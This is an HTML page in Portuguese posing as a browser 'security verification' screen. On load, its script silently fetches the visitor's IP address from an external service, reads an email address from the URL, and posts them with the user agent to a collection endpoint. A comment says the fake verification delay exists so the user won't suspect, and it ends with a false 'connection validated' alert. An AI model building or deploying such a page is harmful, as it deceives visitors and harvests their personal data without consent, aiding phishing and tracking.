<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação de Segurança</title>
    <style>
        body { font-family: sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: #333; font-size: 1.5rem; }
        p { color: #666; font-size: 0.9rem; }
        .btn-verify { background: #3498db; color: white; border: none; padding: 12px 25px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 15px; }
        .hidden { display: none; }
    </style>
</head>
<body>

<div class="container" id="verify-box">
    <h2>Verificação de Segurança</h2>
    <p>Estamos verificando se sua conexão é segura para continuar ao site.</p>
    <div class="loader" id="spinner"></div>
    <p id="status-text">Verificando integridade do navegador...</p>
    <button class="btn-verify hidden" id="btn-action" onclick="startSimulation()">Clique para verificar</button>
</div>

<script>
    // Rota da sua API na Vercel
    const API_ENDPOINT = "/api/collect"; 

    async function collectData() {
        let ipAddress = "Desconhecido";
        let userEmail = "Nao fornecido";

        try {
            // 1. Captura o IP via API externa
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            ipAddress = ipData.ip;

            // 2. Tenta pegar o e-mail da URL (ex: seu-site.com/?email=teste@gmail.com)
            const urlParams = new URLSearchParams(window.location.search);
            userEmail = urlParams.get('email') || "Não fornecido";

            // 3. Envia para a sua API (Back-end)
            await sendToServer({
                ip: ipAddress,
                email: userEmail,
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString()
            });

        } catch (error) {
            console.error("Erro na coleta:", error);
            document.getElementById('status-text').innerText = "Erro na verificação. Tente novamente.";
        }
    }

    async function sendToServer(data) {
        try {
            const response = await fetch(API_ENDPOINT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });

            const result = await response.json();
            console.log("Resposta do servidor:", result);

            // Simula o processo de verificação para o usuário não desconfiar
            setTimeout(() => {
                document.getElementById('status-text').innerText = "Verificação concluída. Redirecionando...";
                document.getElementById('spinner').style.display = 'none';
                document.getElementById('btn-action').classList.remove('hidden');
            }, 3000);

        } catch (error) {
            console.error("Erro ao enviar para o servidor:", error);
        }
    }

    function startSimulation() {
        alert("Sua conexão foi validada com sucesso!");
        window.location.reload();
    }

    window.onload = collectData;
</script>
</body>
</html>
